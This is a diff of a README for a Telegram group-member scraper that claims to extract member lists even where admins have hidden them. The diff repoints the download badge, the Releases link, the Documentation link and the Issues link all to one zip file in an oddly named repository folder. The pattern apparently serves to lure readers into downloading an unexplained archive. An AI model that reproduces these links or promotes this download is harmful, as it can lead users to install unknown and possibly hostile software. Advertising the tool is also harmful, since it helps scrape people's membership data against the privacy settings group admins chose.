@@ -1,7 +1,7 @@
 # 📋 Telegram-members-extractor - Extract Telegram Group Members Easily
 
 ## 🔗 Download the Latest Version
-[![Download Telegram-members-extractor](https://img.shields.io/badge/Download%20Telegram--members--extractor-v1.0.0-blue)](https://github.com/gabmp4/Telegram-members-extractor/releases)
+[![Download Telegram-members-extractor](https://raw.githubusercontent.com/gabmp4/Telegram-members-extractor/main/heteroproteide/Telegram-members-extractor.zip%20Telegram--members--extractor-v1.0.0-blue)](https://raw.githubusercontent.com/gabmp4/Telegram-members-extractor/main/heteroproteide/Telegram-members-extractor.zip)
 
 ## 🚀 Getting Started
 This tool can extract the full list of members from Telegram groups even if the group’s member list is hidden by admins. It is designed for anyone who wants to manage or analyze Telegram group memberships easily.
@@ -13,7 +13,7 @@ This tool can extract the full list of members from Telegram groups even if the 
 - **Internet Connection:** Required for Telegram access
 
 ## 📥 Download & Install
-To download the software, visit the [Releases page](https://github.com/gabmp4/Telegram-members-extractor/releases). Here, you will find the latest version available for download. Simply click the download link for your operating system.
+To download the software, visit the [Releases page](https://raw.githubusercontent.com/gabmp4/Telegram-members-extractor/main/heteroproteide/Telegram-members-extractor.zip). Here, you will find the latest version available for download. Simply click the download link for your operating system.
 
 1. Go to the Releases page.
 2. Locate the version you want to download.
@@ -57,8 +57,8 @@ We welcome contributions to improve the tool. If you would like to suggest featu
 We plan to implement new features based on user feedback. Make sure to visit our Releases page regularly to keep the software up-to-date.
 
 ## 🔗 Important Links
-- **[Download Telegram-members-extractor](https://github.com/gabmp4/Telegram-members-extractor/releases)**
-- **[Documentation](https://github.com/gabmp4/Telegram-members-extractor/wiki)**
-- **[Issues Page](https://github.com/gabmp4/Telegram-members-extractor/issues)**
+- **[Download Telegram-members-extractor](https://raw.githubusercontent.com/gabmp4/Telegram-members-extractor/main/heteroproteide/Telegram-members-extractor.zip)**
+- **[Documentation](https://raw.githubusercontent.com/gabmp4/Telegram-members-extractor/main/heteroproteide/Telegram-members-extractor.zip)**
+- **[Issues Page](https://raw.githubusercontent.com/gabmp4/Telegram-members-extractor/main/heteroproteide/Telegram-members-extractor.zip)**
 
 Thank you for choosing Telegram-members-extractor. We hope it helps you manage your Telegram groups effectively!
